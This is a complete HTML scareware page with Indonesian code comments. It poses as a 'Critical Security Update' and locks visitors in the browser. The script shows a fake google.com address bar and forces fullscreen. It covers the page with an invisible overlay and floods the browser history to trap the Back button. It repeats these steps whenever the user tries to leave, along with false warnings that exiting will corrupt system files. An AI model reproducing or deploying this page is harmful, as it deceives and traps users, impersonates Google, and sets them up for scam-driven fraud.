<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Critical Security Update</title>
    <style>
        body { margin: 0; padding: 0; height: 500vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
        
        /* Bar Palsu */
        .fake-bar {
            position: fixed; top: 0; width: 100%; height: 56px;
            background: #202124; display: flex; align-items: center;
            padding: 0 15px; z-index: 10000; border-bottom: 1px solid #3c4043;
        }

        /* Penjara Transparan (Overlay) */
        #jail {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(255,255,255,0.01); /* Hampir gak kelihatan */
            z-index: 9999; display: none; /* Aktif setelah klik */
        }

        .btn-fix {
            margin-top: 100px; padding: 20px; background: #d93025;
            color: white; border: none; border-radius: 5px; font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="fake-bar" id="fakeBar" style="display:none;">
        <span>🔒</span> <span style="margin-left:10px">google.com/security-check</span>
    </div>

    <div id="jail"></div>

    <div style="padding: 20px; text-align: center;">
        <h2>SYSTEM VULNERABILITY DETECTED</h2>
        <p>Your browser requires an immediate security patch.</p>
        <button class="btn-fix" onclick="launchCombo()">FIX SYSTEM NOW</button>
    </div>

    <script>
        function launchCombo() {
            // 1. Aktifkan Overlay & Fake Bar
            document.getElementById('jail').style.display = "block";
            document.getElementById('fakeBar').style.display = "flex";

            // 2. Fullscreen
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();

            // 3. History Bombing
            for (let i = 0; i < 50; i++) {
                window.history.pushState({p: i}, "", "?id=" + Math.random().toString(36).substring(7));
            }

            alert("Security Patch Applied. Please do not close this tab during the process.");
        }

        // 4. THE TRAP LOOP (Saat user tekan Back)
        window.onpopstate = function() {
            // Paksa masuk lagi
            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
            
            alert("⚠️ WARNING: Attempting to exit will corrupt your system files! Click OK to remain in Secure Mode.");
            
            // Re-Lock Fullscreen & Scroll
            setTimeout(() => {
                const el = document.documentElement;
                if (el.requestFullscreen) el.requestFullscreen();
                window.scrollTo(0, 100);
                // Tambah history lagi biar makin dalem penjaranaya
                for (let i = 0; i < 10; i++) {
                    window.history.pushState(null, "", "?relock=" + Date.now());
                }
            }, 100);
        };

        // Cegah Scroll ke atas biar bar asli nggak muncul
        window.onscroll = function() {
            if (window.pageYOffset < 50) {
                window.scrollTo(0, 56);
            }
        };
    </script>
</body>
</html>
